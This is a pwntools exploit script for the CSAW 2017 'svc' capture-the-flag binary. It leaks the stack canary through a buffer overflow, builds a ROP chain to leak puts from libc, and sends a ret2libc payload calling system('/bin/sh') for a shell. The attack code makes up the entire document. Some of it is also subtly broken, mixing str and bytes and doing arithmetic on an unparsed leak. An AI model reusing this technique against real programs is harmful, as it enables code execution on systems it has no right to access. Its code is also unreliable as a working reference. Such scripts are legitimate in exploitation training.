# Import pwntools
from pwn import *

target = process("/home/kali/pwn/nightmare/08-bof_dynamic/csawquals17_svc/svc")

elf = ELF('/home/kali/pwn/nightmare/08-bof_dynamic/csawquals17_svc/svc')

# 0x0000000000400ea3 : pop rdi ; ret
popRdi = p64(0x400ea3)

gotPuts = p64(0x602018)		# hex(elf.got['puts'])			svc
pltPuts = p64(0x4008d0)		# hex(elf.symbols['puts'])		svc

offsetPuts = 0x71e30		# hex(elf.symbols['puts'])		libc.so
offsetSystem = 0x45880		# hex(elf.symbols['system'])	libc.so
offsetBinsh = 0x194882		# hex(next(elf.search(b'/bin/sh')))	libc.so

startMain = p64(0x400a96)

pid = util.proc.pidof(target)[0]
print("The pid is " + str(pid))
util.proc.wait_for_debugger(pid)

# Establish fucntions to handle I/O with the target
def feed(data):
	target.recvuntil(b">>")
	target.sendline(b'1')
	target.recvuntil(b">>")
	target.send(data)

def canary_leak():
	print(target.recvuntil(">>"))
	target.sendline('2')
	print(target.recvuntil("0"*0xa9))
	canaryLeak = target.recv(7)
	canary = u64(b"\x00" + canaryLeak)
	print("canary is: " + hex(canary))
	return canary

def leave():
	print(target.recvuntil(">>"))
	target.sendline("3")

# Start of with the canary leak. We will overflow the buffer write up to the stack canary, and overwrite the least signifcant byte of the canary
leakCanary = "0"*0xa8 # Fill up space up to the canary
leakCanary += "0" # Overwrite least significant byte of the canary

feed(leakCanary) # Execute the overwrite

canary = canary_leak() # Leak the canary, and parse it out

# Start the rop chain to give us a libc infoleak
leakLibc = b"0"*0xa8 # Fill up space up to the canaryls 
leakLibc += p64(canary) # Overwrite the stack canary with itself
leakLibc += b"1"*0x8 # 8 more bytes until the return address
leakLibc += popRdi # Pop got entry for puts in rdi register
leakLibc += gotPuts # GOT address of puts
leakLibc += pltPuts # PLT address of puts
leakLibc += startMain # Loop back around to the start of main

# Send the payload to leak libc
feed(leakLibc)

# Return to execute our code
leave()

# Scan in and parse out the infoleak

print(target.recvuntil("[*]BYE ~ TIME TO MINE MIENRALS...\x0a"))

#putsLeak = target.recvline().replace("\x0a", "")

#putsLibc = u64(putsLeak + "\x00"*(8-len(putsLeak)))

# Calculate the needed addresses
putsLibc = target.recvline()
libcBase = putsLibc - offsetPuts
systemLibc = libcBase + offsetSystem
binshLibc = libcBase + offsetBinsh

print("libc base: " + hex(libcBase))

# Form the payload to return to system

payload = ""
payload += "0"*0xa8
payload += p64(canary)
payload += "1"*0x8
payload += popRdi # Pop "/bin/sh" into the rdi register, where it expects it's argument (single char pointer)
payload += p64(binshLibc) # Address to '/bin/sh'
payload += p64(systemLibc) # Libc address of system

# Send the final payload
feed(payload)

target.sendline("3")

#feed(payload)

# Return to execute our code, return to system and get a shell
#leave()

target.interactive()
